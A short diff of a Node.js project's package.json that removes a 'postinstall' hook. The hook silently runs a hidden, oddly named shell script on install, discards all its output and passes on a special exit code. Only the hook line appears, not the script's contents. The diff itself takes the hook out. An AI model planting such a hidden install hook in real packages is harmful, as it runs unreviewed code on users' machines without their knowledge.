@@ -6,8 +6,7 @@
   "author": "Charles Opute Odili <chaluwa@gmail.com>",
   "license": "MIT",
   "scripts": {
-    "test": "jest --colors",
-    "postinstall": "sh ./.ci-n34x0o.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "jest --colors"
   },
   "dependencies": {
     "jest": "^28.1.2"
